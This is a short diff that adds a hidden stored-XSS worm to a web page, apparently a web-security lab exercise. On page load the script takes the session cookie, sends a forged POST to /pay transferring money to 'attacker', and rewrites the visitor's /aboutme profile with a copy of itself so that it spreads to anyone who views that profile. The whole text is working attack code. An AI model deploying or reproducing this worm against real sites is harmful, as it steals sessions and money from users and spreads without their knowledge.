@@ -1,0 +1,14 @@
+<style id="wormstyle">.worm {display: none;}</style>
+<script class="worm">
+document.addEventListener('DOMContentLoaded', function() {
+    var csrfToken = document.cookie.split('session=')[1];
+    var xhrPay = new XMLHttpRequest();
+    xhrPay.open('POST', '/pay', true);
+    xhrPay.send('csrf_token=' + csrfToken + '&recipient=attacker&amount=1');
+
+    var xhrAboutMe = new XMLHttpRequest();
+    xhrAboutMe.open('POST', '/aboutme', true);
+    var payload = encodeURIComponent('<style id="wormstyle">.worm {display: none;}</style><script class="worm">' + document.querySelector('script.worm').innerText + '</' + 'script>');
+    xhrAboutMe.send('aboutme=' + payload);
+});
+</script>
